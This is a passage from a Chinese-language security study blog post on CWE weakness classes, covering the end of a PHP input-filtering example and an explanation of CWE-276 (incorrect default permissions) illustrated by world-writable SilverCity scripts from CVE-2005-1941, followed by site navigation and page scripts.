    <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token class-name static-context">Filter</span><span class="token operator">::</span><span class="token function">filterVar</span><span class="token punctuation">(</span><span class="token variable">$postData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_EMAIL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token class-name static-context">Filter</span><span class="token operator">::</span><span class="token function">filterVar</span><span class="token punctuation">(</span><span class="token variable">$postData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'link'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_URL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$attached</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token class-name static-context">Filter</span><span class="token operator">::</span><span class="token function">filterVar</span><span class="token punctuation">(</span><span class="token variable">$postData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">FILTER_SANITIZE_SPECIAL_CHARS</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$mailto</span> <span class="token operator">=</span> <span class="token class-name static-context">Filter</span><span class="token operator">::</span><span class="token function">filterArray</span><span class="token punctuation">(</span><span class="token variable">$postData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'mailto[]'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$faqLanguage</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token class-name static-context">Filter</span><span class="token operator">::</span><span class="token function">filterVar</span><span class="token punctuation">(</span><span class="token variable">$postData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'lang'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">FILTER_SANITIZE_SPECIAL_CHARS</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$faqId</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token class-name static-context">Filter</span><span class="token operator">::</span><span class="token function">filterVar</span><span class="token punctuation">(</span><span class="token variable">$postData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'faqId'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_INT</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$categoryId</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token class-name static-context">Filter</span><span class="token operator">::</span><span class="token function">filterVar</span><span class="token punctuation">(</span><span class="token variable">$postData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'categoryId'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_INT</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$mailto</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$mailto</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$response</span><span class="token operator">-></span><span class="token function">setStatusCode</span><span class="token punctuation">(</span><span class="token class-name static-context">Response</span><span class="token operator">::</span><span class="token constant">HTTP_BAD_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$response</span><span class="token operator">-></span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span> <span class="token operator">=></span> <span class="token class-name static-context">Translation</span><span class="token operator">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'err_sendMail'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre></div></div><h3 class="x-h2"><a href="https://cwe.mitre.org/data/definitions/276.html" target="_blank" rel="noreferrer">【B】CWE-276: Incorrect Default Permissions</a></h3><p class="x-p">错误的默认权限。指软件系统、应用程序、文件或资源在创建时被分配了不适当的默认权限。这些默认权限可能过于宽松，允许未授权的用户或进程进行不必要或有害的访问和操作，从而导致潜在的安全漏洞。</p><h4 class="x-h3">Example 1</h4><p class="x-p">软件在安装或初始化时，通常会创建一些文件、目录或资源。这些资源会被分配默认的权限（读、写、执行权限等）。</p><p class="x-p">如果这些默认权限设置得过于宽松，比如允许所有用户都具有读写权限，那么未授权的用户可能会访问、修改或删除这些文件，导致数据泄露、篡改或破坏。</p><div class="x-highlightblock highlight-background-blue"><h4 class="x-h3">Example in real-world project</h4><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>OpenCVE：<a href="https://www.opencve.io/cve/CVE-2005-1941" target="_blank" rel="noreferrer" class="x-inline-link">CVE-2005-1941</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Exploit</code>：<a href="https://bugs.gentoo.org/93558" target="_blank" rel="noreferrer" class="x-inline-link">https://bugs.gentoo.org/93558</a></p></div></div><p class="x-p">0.9.5-r1版本之前的SilverCity安装了<code class="x-inline-highlight">cgi-styler-form.py</code>、<code class="x-inline-highlight">cgistyler.py</code>和<code class="x-inline-highlight">source2html.py</code>，具有<code class="x-inline-highlight">world writable</code>权限。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Plain Text</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code># ls -l /usr/bin/*.py
-rwxrwxrwx  1 root root 4443 May 22 16:58 /usr/bin/cgi-styler-form.py
-rwxrwxrwx  1 root root 2990 May 22 16:58 /usr/bin/cgi-styler.py
-rwxrwxrwx  1 root root 3776 May 22 16:58 /usr/bin/source2html.py
</code></pre></div></div><!--/$--><button class="like-button not-loaded"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 1024 896"><path d="M512 911l-62-56C230 655 85 524 85 363 85 231 189 128 320 128c74 0 145 35 192 89 47-55 118-89 192-89 131 0 235 103 235 235 0 161-145 293-365 492l-62 56z" fill="#FCFCFC"></path></svg></button></div><div id="sidebar"><div id="sidebar-width-wrapper"><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">网络杂识<!-- --> (<!-- -->8<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/23d/database-3nf/"><span>数据库设计三大范式</span></a></li><li><a class="link" href="/23d/github-linguist-vendored/"><span>不统计Github仓库某个目录下的语言</span></a></li><li><a class="link" href="/24a/deepl-shortcut-setting/"><span>解决：DeepL该快捷键已被使用</span></a></li><li><a class="link" href="/24a/git-merge-allow-unrelated-histories/"><span>记录：使用--allow-unrelated-histories</span></a></li><li><a class="link" href="/24b/injective-surjective-bijective/"><span>单射、满射、双射</span></a></li><li><a class="link" href="/25a/tai-e-a2-additional-case/"><span>南京大学程序分析Lab2（常量传播）易错样例补充</span></a></li><li><a class="link" href="/25a/tai-e-a3-solution/"><span>南京大学程序分析Lab3（死代码消除）思路</span></a></li><li><a class="link" href="/25b/debug-x86_64-program-in-arm64-system/"><span>使用QEMU在ARM64系统上调试x86_64程序</span></a></li></ul></div></div><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">安全学习<!-- --> (<!-- -->15<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/longtime/wp-portswigger/"><span>PortSwigger Writeup</span></a></li><li><a class="link" href="/23d/hust-cas-login/"><span>Python登录华科统一身份认证接口</span></a></li><li><a class="link active" href="/24b/learn-cwes/"><span>Learn CWEs &amp; Real-word Examples</span></a></li><li><a class="link" href="/24b/cross-site-scripting/"><span>Learn XSS</span></a></li><li><a class="link" href="/24b/cross-site-request-forgery/"><span>Learn CSRF</span></a></li><li><a class="link" href="/24d/wp-bluehens-2024/"><span>BlueHens CTF 2024 Writeup</span></a></li><li><a class="link" href="/24d/wp-1337uplive-2024/"><span>1337UP LIVE CTF 2024 Writeup</span></a></li><li><a class="link" href="/24d/wp-m0lecon-2025/"><span>m0leCon Beginner CTF 2025 Writeup</span></a></li><li><a class="link" href="/24d/wp-0xl4ugh-2024/"><span>0xl4ugh CTF 2024 Writeup</span></a></li><li><a class="link" href="/25a/wp-nullcon-hackim-2025/"><span>Nullcon HackIM CTF 2025 Writeup</span></a></li><li><a class="link" href="/25a/wp-picoctf-2025/"><span>picoCTF 2025 Writeup</span></a></li><li><a class="link" href="/25a/wp-cyber-apocalypse-ctf-2025/"><span>HTB Cyber Apocalypse CTF 2025 Writeup</span></a></li><li><a class="link" href="/25a/wp-swampctf-2025/"><span>SwampCTF 2025 Writeup</span></a></li><li><a class="link" href="/25b/wp-1753ctf-2025/"><span>1753CTF 2025 Writeup</span></a></li><li><a class="link" href="/25b/wp-nahamcon-ctf-2025/"><span>NahamCon CTF 2025 Writeup</span></a></li></ul></div></div><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">安全研究<!-- --> (<!-- -->9<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/longtime/papers-sec/"><span>论文速记：安全</span></a></li><li><a class="link" href="/24b/papers-sec-240514-taintmini/"><span>论文阅读：TAINTMINI: Detecting Flow of Sensitive Data in Mini-Programs with Static Taint Analysis (ICSE 2023)</span></a></li><li><a class="link" href="/24c/papers-sec-240728-2fa-consistency/"><span>论文阅读：A Systematic Study of the Consistency of Two-Factor Authentication User Journeys on Top-Ranked Websites (NDSS 2023)</span></a></li><li><a class="link" href="/24c/papers-sec-240810-conquer/"><span>论文阅读：Do Not Give A Dog Bread Every Time He Wags His Tail: Stealing Passwords through Content Queries (CONQUER) Attack (NDSS 2023)</span></a></li><li><a class="link" href="/24c/papers-sec-240817-2fa-failures/"><span>论文阅读：Security and Privacy Failures in Popular 2FA Apps (Security 2023)</span></a></li><li><a class="link" href="/24c/papers-sec-240824-zxcvbn/"><span>论文阅读：zxcvbn: Low-Budget Password Strength Estimation (Security 2016)</span></a></li><li><a class="link" href="/24c/papers-sec-240902-pafa-authentication/"><span>论文阅读：Maginot Line: Assessing a New Cross-app Threat to PII-as-Factor Authentication in Chinese Mobile Apps (NDSS 2024)</span></a></li><li><a class="link" href="/24c/papers-sec-240922-pre-hijacked-accounts/"><span>论文阅读：Pre-hijacked accounts: An Empirical Study of Security Failures in User Account Creation on the Web (Security 2022)</span></a></li><li><a class="link" href="/24d/papers-sec-241207-aimie/"><span>论文阅读：Understanding and Detecting Abused Image Hosting Modules as Malicious Services (CCS 2023)</span></a></li></ul></div></div><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">算法<!-- --> (<!-- -->26<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/24b/sorting-algorithm/"><span>排序算法总结与代码实现</span></a></li><li><a class="link" href="/24b/mst-and-sp/"><span>最小生成树与最短路算法</span></a></li><li><a class="link" href="/24a/csp-2016-04/"><span>CSP 201604 T1-T4题解</span></a></li><li><a class="link" href="/24a/csp-2018-03/"><span>CSP 201803 T1-T4题解</span></a></li><li><a class="link" href="/24a/csp-2020-06/"><span>CSP 202006 T1-T4题解</span></a></li><li><a class="link" href="/24a/csp-2020-09/"><span>CSP 202009 T1-T4题解</span></a></li><li><a class="link" href="/24a/csp-2020-12/"><span>CSP 202012 T1-T5题解</span></a></li><li><a class="link" href="/24a/csp-2022-06/"><span>CSP 202206 T1-T5题解</span></a></li><li><a class="link" href="/24a/csp-2023-05/"><span>CSP 202305 T1-T5题解</span></a></li><li><a class="link" href="/24a/csp-2023-09/"><span>CSP 202309 T1-T4题解</span></a></li><li><a class="link" href="/24b/leetcode-4/"><span>LeetCode 4.寻找两个正序数组的中位数</span></a></li><li><a class="link" href="/24b/leetcode-30/"><span>LeetCode 30.串联所有单词的子串</span></a></li><li><a class="link" href="/24b/leetcode-37/"><span>LeetCode 37.解数独</span></a></li><li><a class="link" href="/24c/leetcode-42/"><span>LeetCode 42.接雨水</span></a></li><li><a class="link" href="/24c/leetcode-51/"><span>LeetCode 51.N皇后</span></a></li><li><a class="link" href="/24c/leetcode-52/"><span>LeetCode 52.N皇后 II</span></a></li><li><a class="link" href="/24b/leetcode-60/"><span>LeetCode 60.排列序列</span></a></li><li><a class="link" href="/24b/leetcode-65/"><span>LeetCode 65.有效数字</span></a></li><li><a class="link" href="/24c/leetcode-68/"><span>LeetCode 68.文本左右对齐</span></a></li><li><a class="link" href="/24b/leetcode-84/"><span>LeetCode 84.柱状图中最大的矩形</span></a></li><li><a class="link" href="/24c/leetcode-85/"><span>LeetCode 85.最大矩形</span></a></li><li><a class="link" href="/24c/leetcode-149/"><span>LeetCode 149.直线上最多的点数</span></a></li><li><a class="link" href="/24d/leetcode-282/"><span>LeetCode 282.给表达式添加运算符</span></a></li><li><a class="link" href="/24b/leetcode-312/"><span>LeetCode 312.戳气球</span></a></li><li><a class="link" href="/24b/leetcode-1373/"><span>LeetCode 1373.二叉搜索子树的最大键值和</span></a></li><li><a class="link" href="/24b/leetcode-1739/"><span>LeetCode 1739.放置盒子</span></a></li></ul></div></div><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">深度学习<!-- --> (<!-- -->8<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/longtime/papers-dl/"><span>论文速记：深度学习</span></a></li><li><a class="link" href="/23d/r2plus1d/"><span>行为识别R(2+1)D网络</span></a></li><li><a class="link" href="/23d/object-detection-map/"><span>目标检测评价指标mAP</span></a></li><li><a class="link" href="/23d/learn-rnn-lstm/"><span>学习RNN和LSTM</span></a></li><li><a class="link" href="/24a/reproduce-nerf-rpn/"><span>记录：复现NeRF-RPN代码</span></a></li><li><a class="link" href="/24b/yolov5-obb-nms-rotated/"><span>解决：nms_rotated报错&quot;THC/THC.h&quot;: No such file or directory</span></a></li><li><a class="link" href="/24c/winograd/"><span>Winograd算法</span></a></li><li><a class="link" href="/24c/model-optimization/"><span>模型优化概述：量化、压缩、轻量化</span></a></li></ul></div></div><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">编程语言<!-- --> (<!-- -->5<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/23c/js-array/"><span>JavaScript数组常用方法</span></a></li><li><a class="link" href="/24a/cpp-stl/"><span>C++中STL的基本使用</span></a></li><li><a class="link" href="/24a/torch-numpy-topk/"><span>在pytorch和numpy中取top-k值和索引</span></a></li><li><a class="link" href="/24a/object-oriented-programming-python/"><span>Python面向对象编程</span></a></li><li><a class="link" href="/24c/asm8086-snake/"><span>8086汇编贪吃蛇</span></a></li></ul></div></div><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">前端<!-- --> (<!-- -->2<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/23d/css-auto-height-transition/"><span>CSS实现auto高度的过渡动画</span></a></li><li><a class="link" href="/24d/android-send-explicit-intent-to-dynamically-registered-receiver/"><span>不能向动态注册的广播接收器发送显式Intent</span></a></li></ul></div></div><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">课程笔记<!-- --> (<!-- -->19<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/24b/rank-inequality/"><span>【线性代数】对秩不等式的理解</span></a></li><li><a class="link" href="/23c/pattern-recognition-1/"><span>【模式识别】统计决策方法</span></a></li><li><a class="link" href="/23c/pattern-recognition-2/"><span>【模式识别】参数估计</span></a></li><li><a class="link" href="/23c/pattern-recognition-3/"><span>【模式识别】非参数估计</span></a></li><li><a class="link" href="/23d/pattern-recognition-4/"><span>【模式识别】线性学习器与线性分类器</span></a></li><li><a class="link" href="/23d/protocols/"><span>【计算机网络】协议总结</span></a></li><li><a class="link" href="/24a/machine-learning-exercises/"><span>【机器学习】习题</span></a></li><li><a class="link" href="/24a/games101-01-transformation/"><span>【GAMES101】Transformation</span></a></li><li><a class="link" href="/24a/games101-02-rasterization/"><span>【GAMES101】Rasterization</span></a></li><li><a class="link" href="/24a/games101-03-shading/"><span>【GAMES101】Shading</span></a></li><li><a class="link" href="/24a/games101-04-geometry/"><span>【GAMES101】Geometry</span></a></li><li><a class="link" href="/24c/assembly-1/"><span>【汇编语言】访问寄存器和内存</span></a></li><li><a class="link" href="/24c/assembly-2/"><span>【汇编语言】汇编语言编程</span></a></li><li><a class="link" href="/24c/assembly-3/"><span>【汇编语言】内存寻址方式</span></a></li><li><a class="link" href="/24c/assembly-4/"><span>【汇编语言】流程转移与子程序</span></a></li><li><a class="link" href="/24c/assembly-5/"><span>【汇编语言】标志寄存器</span></a></li><li><a class="link" href="/24c/assembly-6/"><span>【汇编语言】中断及外部设备操作</span></a></li><li><a class="link" href="/24d/crypto-1/"><span>【密码学】流密码</span></a></li><li><a class="link" href="/24d/crypto-2/"><span>【密码学】块密码</span></a></li></ul></div></div><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">杂记<!-- --> (<!-- -->4<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/24b/by-questions/"><span>专业课复习</span></a></li><li><a class="link" href="/24d/about-interactive-multimedia/"><span>关于交互式多媒体</span></a></li><li><a class="link" href="/longtime/hundred-thousand/"><span>十万</span></a></li><li><a class="link" href="/longtime/linux-commands/"><span>三开</span></a></li></ul></div></div><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">交互式多媒体<!-- --> (<!-- -->3<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/24d/about-interactive-multimedia/"><span>关于交互式多媒体</span></a></li><li><a class="link" href="/23c/pattern-recognition-1/"><span>【模式识别】统计决策方法</span></a></li><li><a class="link" href="/23d/css-auto-height-transition/"><span>CSS实现auto高度的过渡动画</span></a></li></ul></div></div></div></div><div id="sidebar-mask"></div></div><script src="/_next/static/chunks/webpack-e1a5f2ba60e36b85.js" crossorigin="" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0]);self.__next_f.push([2,null])</script><script>self.__next_f.push([1,"1:HL[\"/_next/static/css/268aef745a7b3740.css\",\"style\",{\"crossOrigin\":\"\"}]\n0:\"$L2\"\n"])</script><script>self.__next_f.push([1,"3:HL[\"/_next/static/css/34565287a23191ed.css\",\"style\",{\"crossOrigin\":\"\"}]\n"])</script><script>self.__next_f.push([1,"4:I[47690,[],\"\"]\n6:I[55329,[\"481\",\"static/chunks/457b8330-b5c9cf3fcf214847.js\",\"954\",\"static/chunks/d3ac728e-0c798b3b8aa3bf53.js\",\"250\",\"static/chunks/250-0ef8476c0fa8ee24.js\",\"612\",\"static/chunks/612-fa632c1349770315.js\",\"551\",\"static/chunks/551-19232c47cd1e883a.js\",\"842\",\"static/chunks/842-812b9489b5c7f4d9.js\",\"877\",\"static/chunks/app/%5B...slug%5D/page-5eb8e12f7c16248f.js\"],\"\"]\n7:I[76842,[\"481\",\"static/chunks/457b8330-b5c9cf3fcf214847.js\",\"250\",\"static/chunks/250-0ef8476c0fa8ee24.js\",\"612\",\"static/chunks/612-fa632c1349770315.js\",\"842\",\"static/chunks/842-812b9489b5c7f4d9.js\",\"931\",\"static/chunks/app/page-8a7b32c8a4befa3e.js\"],\"PostMeta\"]\n8:\"$Sreact.suspense\"\na:I[76842,[\"481\",\"static/chunks/457b8330-b5c9cf3fcf214847.js\",\"250\",\"static/chunks/250-0ef8476c0fa8ee24.js\",\"612\",\"static/chunks/612-fa632c1349770315.js\",\"842\",\"static/chunks/842-812b9489b5c7f4d9.js\",\"931\",\"static/chunks/app/page-8a7b32c8a4befa3e.js\"],\"LikeButton\"]\nb:I[30389,[\"481\",\"static/chunks/457b8330-b5c9cf3fcf214847.js\",\"954\",\"static/chunks/d3ac728e-0c798b3b8aa3bf53.js\",\"250\",\"static/chunks/250-0ef8476c0fa8ee24.js\",\"612\",\"static/chunks/612-fa632c1349770315.js\",\"551\",\"static/chunks/551-19232c47cd1e883a.js\",\"842\",\"static/chunks/842-812b9489b5c7f4d9.js\",\"877\",\"static/chunks/app/%5B...slug%5D/page-5eb8e12f7c16248f.js\"],\"\"]\nc:I[5613,[],\"\"]\ne:I[31778,[],\"\"]\nf:I[25694,[\"250\",\"static/chunks/250-0ef8476c0fa8ee24.js\",\"185\",\"static/chunks/app/layout-8f33aca7be8ff34b.js\"],\"GlobalProvider\"]\n10:I[30397,[\"250\",\"static/chunks/250-0ef8476c0fa8ee24.js\",\"185\",\"static/chunks/app/layout-8f33aca7be8ff34b.js\"],\"\"]\n12:I[48955,[],\"\"]\nd:[\"slug\",\"24b/learn-cwes\",\"c\"]\n13:[]\n"])</script><script>self.__next_f.push([1,"2:[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/268aef745a7b3740.css\",\"precedence\":\"next\",\"crossOrigin\":\"\"}]],[\"$\",\"$L4\",null,{\"buildId\":\"lVH95Sk7T5RRWnOeaICzA\",\"assetPrefix\":\"\",\"initialCanonicalUrl\":\"/24b/learn-cwes/\",\"initialTree\":[\"\",{\"children\":[[\"slug\",\"24b/learn-cwes\",\"c\"],{\"children\":[\"__PAGE__?{\\\"slug\\\":[\\\"24b\\\",\\\"learn-cwes\\\"]}\",{}]}]},\"$undefined\",\"$undefined\",true],\"initialSeedData\":[\"\",{\"children\":[[\"slug\",\"24b/learn-cwes\",\"c\"],{\"children\":[\"__PAGE__\",{},[\"$L5\",[[\"$\",\"$L6\",null,{}],[\"$\",\"div\",null,{\"id\":\"post-layout\",\"children\":[false,[\"$\",\"div\",null,{\"id\":\"main\",\"className\":\"center-wrapper\",\"children\":[[\"$\",\"h1\",null,{\"className\":\"post-title\",\"children\":\"Learn CWEs \u0026 Real-word Examples\"}],[\"$\",\"$L7\",null,{\"path\":\"/24b/learn-cwes/\"}],[\"$\",\"$8\",null,{\"fallback\":[\"$\",\"p\",null,{\"children\":\"Loading component...\"}],\"children\":\"$L9\"}],[\"$\",\"$La\",null,{\"path\":\"/24b/learn-cwes/\"}]]}],[\"$\",\"$Lb\",null,{}]]}]],null]]},[\"$\",\"$Lc\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"$d\",\"children\"],\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"loadingScripts\":\"$undefined\",\"hasLoading\":false,\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$Le\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"styles\":[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/34565287a23191ed.css\",\"precedence\":\"next\",\"crossOrigin\":\"\"}]]}]]},[null,[\"$\",\"html\",null,{\"lang\":\"zh-CN\",\"suppressHydrationWarning\":true,\"children\":[[\"$\",\"head\",null,{\"children\":[[\"$\",\"link\",null,{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\"}],[\"$\",\"script\",null,{\"async\":true,\"src\":\"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js\"}],[\"$\",\"script\",null,{\"async\":true,\"src\":\"https://www.googletagmanager.com/gtag/js?id=G-45BYSZ6WPY\"}],[\"$\",\"script\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\\nwindow.dataLayer = window.dataLayer || [];\\nfunction gtag() {\\n    dataLayer.push(arguments);\\n}\\ngtag('js', new Date());\\ngtag('config', 'G-45BYSZ6WPY');\\n\"}}],[\"$\",\"script\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"const a=z=\u003eh.getItem(z),b=(y,z)=\u003eh.setItem(y,z),c=(y,z)=\u003edocument.documentElement.setAttribute(y,z),d='theme',e='dark',f='light',g='class',h=localStorage;a(d)!==e\u0026\u0026a(d)!==f\u0026\u0026b(d,f);a(d)===e?c(g,e):c(g,f);\"}}],[\"$\",\"script\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\\nif (!Array.prototype.findLast) {\\n    Array.prototype.findLast = function (callback) {\\n        for (let i = this.length - 1; i \u003e= 0; i--) {\\n            if (callback(this[i])) return this[i];\\n        }\\n        return undefined;\\n    };\\n}\\nif (!Array.prototype.findLastIndex) {\\n    Array.prototype.findLastIndex = function (callback) {\\n        for (let i = this.length - 1; i \u003e= 0; i--) {\\n            if (callback(this[i])) return i;\\n        }\\n        return -1;\\n    